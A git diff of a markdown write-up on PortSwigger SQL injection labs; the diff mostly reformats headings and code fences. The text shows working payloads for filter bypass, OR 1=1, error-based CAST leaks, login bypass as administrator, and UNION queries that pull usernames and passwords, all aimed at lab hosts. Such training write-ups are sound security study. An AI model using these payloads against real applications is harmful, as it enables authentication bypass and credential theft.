@@ -13,7 +13,7 @@
 
 ---
 
-<h3 align="center">🤫 Lab 1 - Retrieving Hidden Data via SQL Injection</h3>
+<h2 align="center">🤫 Lab 1 - Retrieving Hidden Data via SQL Injection</h2>
 
 <p align="center">
   <b>Lab: SQL Injection Vulnerability allows retriving hidden data</b><br>
@@ -24,7 +24,7 @@
 
 > This lab contains a SQL injection vulnerability in the product category filter. The application constructs a SQL query like:
 
-```sql
+```
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```
 
@@ -32,29 +32,29 @@ Your goal is to perform a SQLi attack and **display unreleased products**.
 
 ---
 
-### 🎯 Goal
+## 🎯 Goal
 
 ✅ **Exploit SQL Injection to bypass filter and display unreleased products.**
 
 ---
 
-### 🛠️ Basic Injection Strategy
+## 🛠️ Basic Injection Strategy
 
 When selecting a category, the app builds the query dynamically without sanitization:
 
-```sql
+```
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```
 
 You can inject a comment to nullify the second condition:
 
-```http
+```
 https://insecure-website.com/products?category=Gifts'--
 ```
 
 🔎 This results in:
 
-```sql
+```
 SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
 ```
 
@@ -63,24 +63,24 @@ SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
 
 ---
 
-### 🧪 Test: All Categories (OR Based)
+## 🧪 Test: All Categories (OR Based)
 
 Injecting logic always true to access everything:
 
-```http
+```
 https://insecure-website.com/products?category=Gifts'+OR+1=1--
 ```
 
 Resulting SQL:
 
-```sql
+```
 SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 ```
 
 - `1=1` is always true → All products from all categories shown.
 ---
 
-### 🧩 Injection Cheat Sheet
+## 🧩 Injection Cheat Sheet
 
 | Injection Type | Payload | Effect |
 |----------------|---------|--------|
@@ -88,30 +88,30 @@ SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 | Boolean OR | `' OR 1=1--` | Always true condition |
 | Error-Based | `' AND 1=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||CHR(113)||CHR(122)||CHR(120)||CHR(113)||CHR(113) AS NUMERIC)--` | Can cause errors and leak info |
 
-### ✅ Lab Status
+## ✅ Lab Status
 > ✔️ **Completed** - Successfully display unreleased products.
 
 ------
 
-<h3 align="center"> 💉Lab 2 - SQL Injection Vulnerability Allowing Login Bypass </h3>
+<h2 align="center"> 💉Lab 2 - SQL Injection Vulnerability Allowing Login Bypass </h2>
 
 <p align="center">
   <b>Lab: SQL Injection Vulnerability Allowing Login Bypass</b><br>
   <i>Target: Login as <code>administrator</code> by bypassing authentication via SQL Injection.</i>
 </p>
 
-### 🎯 Objective
+## 🎯 Objective
 Perform a SQL injection attack to log in to the application as the `administrator` user.
 
 ---
 
-### 🧪 Scenario Description
+## 🧪 Scenario Description
 
 This lab contains a SQL injection vulnerability in the **login function**.
 
 The application executes a SQL query similar to:
 
-```sql
+```
 SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
 ```
 
@@ -119,16 +119,16 @@ Since the application doesn’t implement proper sanitization, you can exploit t
 
 ---
 
-### 🧠 Understanding the Attack
+## 🧠 Understanding the Attack
 Injecting the following payload into the `username` field:
 ```
 administrator'--
 ```
 
-### Why it works?
+## Why it works?
 This transforms the backend query to:
 
-```sql
+```
 SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 ```
 
@@ -138,13 +138,13 @@ Here:
 
 ---
 
-### 🧰 Tools Used
+## 🧰 Tools Used
 - 🔍 **Burp Suite**: Used to intercept and modify HTTP request
 - 🔑 **Browser**: To view result post-exploit
 
 ---
 
-### 🚦 Steps to Solve
+## 🚦 Steps to Solve
 <details>
 <summary>📋 <strong>Step-by-step Instructions</strong></summary>
 
@@ -162,24 +162,25 @@ Here:
 </details>
 
 ---
-### ✅ Lab Status
+
+## ✅ Lab Status
 > ✔️ **Completed** - Successfully bypassed authentication and logged in as administrator.
 ---
 
 
-<h3 align="center">🔍 Lab 3 - Determining Number of Columns via UNION SQL Injection</h3>
+<h2 align="center">🔍 Lab 3 - Determining Number of Columns via UNION SQL Injection</h2>
 
 <p align="center">
   <b>Lab: SQL injection UNION attack, determining the number of columns returned by the query</b><br>
   <i>Target: determine number of columns via SQLi + UNION attack.</i>
 </p>
 
-### 🧠 Lab Context
+## 🧠 Lab Context
 
 > This lab contains a SQL injection vulnerability in the product category filter. 
 > The results from the query are returned in the application's response.
 
-```sql
+```
 SELECT * FROM products WHERE category = 'Gifts'
 ```
 
@@ -187,13 +188,13 @@ Your goal is to inject a UNION-based payload that matches the column count of th
 
 ---
 
-### 🎯 Goal
+## 🎯 Goal
 
 ✅ **Exploit UNION-based SQLi to determine the number of columns in the original query.**
 
 ---
 
-### 🛠️ UNION Injection Strategy
+## 🛠️ UNION Injection Strategy
 
 The application returns SQL results directly in the HTTP response, allowing you to probe using:
 
@@ -215,7 +216,7 @@ This lets you determine how many columns the original query returns.
 
 ---
 
-### 🔢 Alternative Strategy: ORDER BY
+## 🔢 Alternative Strategy: ORDER BY
 
 You can also infer column count using `ORDER BY`:
 
@@ -229,7 +230,7 @@ When the ORDER BY number exceeds the actual column count, an error will be shown
 
 ---
 
-### 🧪 Payload Testing Table
+## 🧪 Payload Testing Table
 
 | Technique        | Payload                            | Description                                      |
 |------------------|------------------------------------|--------------------------------------------------|
@@ -239,20 +240,20 @@ When the ORDER BY number exceeds the actual column count, an error will be shown
 | ORDER BY         | `' ORDER BY 1--` | Orders by column 1                               |
 | ORDER BY         | `' ORDER BY 3--` | If this breaks → original has less than 3 cols   |
 
-### ✅ Lab Status
+## ✅ Lab Status
 
 > ✔️ Completed - Null-based UNION injection to identify correct column count.
 
 ---
 
-<h3 align="center">🔍 Lab 4 - Finding a Column Containing Text Using SQL Injection</h3>
+<h2 align="center">🔍 Lab 4 - Finding a Column Containing Text Using SQL Injection</h2>
 
 <p align="center">
   <b>Lab: SQL injection UNION attack to find a column that supports text</b><br>
   <i>Target: Identify a column that supports string data to leak usernames and passwords.</i>
 </p>
 
-### 🧠 Lab Context
+## 🧠 Lab Context
 
 > This lab has a SQL injection vulnerability in the product category filter.
 > 
@@ -263,14 +264,14 @@ When the ORDER BY number exceeds the actual column count, an error will be shown
 
 ---
 
-### 🎯 Goal
+## 🎯 Goal
 
 ✅ **Exploit SQLi using UNION SELECT to find a text-compatible column and retrieve string values.**
 
 ---
-### 🛠️ Steps to Attack
+## 🛠️ Steps to Attack
 
-#### 1. 🔢 Determine Number of Columns
+### 1. 🔢 Determine Number of Columns
 
 You already learned this in the previous lab. For example, if the below payload gives no error:
 
@@ -299,16 +300,16 @@ https://<LAB-ID>.web-security-academy.net/filter?category=Lifestyle'+UNION+SELEC
 ```
 This returns administrator*<password> if the second column supports text
 
-### 📌 Notes
+## 📌 Notes
 On MySQL: -- must be followed by a space or use # for comment.
 On Oracle: Use FROM DUAL if required.
 
-### ✅ Lab Status
+## ✅ Lab Status
 > ✔️ Completed - Successfully retrieved admin credentials by finding string-compatible column.
 ---
 
 
-<h3 align="center">🧠 Lab 5 - SQL Injection UNION Attack: Retrieving Data from Other Tables</h3>
+<h2 align="center">🧠 Lab 5 - SQL Injection UNION Attack: Retrieving Data from Other Tables</h2>
 
 <p align="center">
   <b>Lab: SQL injection UNION attack, retrieving data from other tables</b><br>
@@ -316,7 +317,7 @@ On Oracle: Use FROM DUAL if required.
 </p>
 
 
-### 🧠 Lab Context
+## 🧠 Lab Context
 
 > This lab contains a SQL injection vulnerability in the product category filter.  
 > The vulnerable query is likely similar to:
@@ -325,11 +326,11 @@ SELECT name, description FROM products WHERE category = 'Lifestyle'
 ```
 You must inject into the category parameter and use a UNION-based SQL injection to retrieve data from a different table.
 
-### 🎯 Goal
+## 🎯 Goal
 ✅ Retrieve all usernames and passwords from the users table and log in as the administrator.
 
-### 🧠 Step-by-Step Strategy
-####🔹 Step 1: Determine Number of Columns
+## 🧠 Step-by-Step Strategy
+###🔹 Step 1: Determine Number of Columns
 Use NULL placeholders in the UNION SELECT until it succeeds:
 
 ```
@@ -337,7 +338,7 @@ Use NULL placeholders in the UNION SELECT until it succeeds:
 ```
 ✔️ If the server responds without an error and shows an extra row, then there are 2 columns in the original query.
 
-####🔹 Step 2: Identify Text-Compatible Columns
+###🔹 Step 2: Identify Text-Compatible Columns
 Inject known strings to find which columns accept text:
 
 ```
@@ -345,7 +346,7 @@ Inject known strings to find which columns accept text:
 ```
 ✔️ Observe where 'abc' or 'def' appear in the UI — those are the text-compatible columns.
 
-####🔹 Step 3: Extract User Data
+###🔹 Step 3: Extract User Data
 Now inject the following to exfiltrate data from the users table:
 
 ```
@@ -353,7 +354,7 @@ Now inject the following to exfiltrate data from the users table:
 ```
 ✅ This will display usernames and passwords on the application's main page.
 
-####💡 Login as Administrator
+###💡 Login as Administrator
 Use the credentials you retrieved to log in as the administrator through the provided login form.
 
 🧩 Injection Cheat Sheet
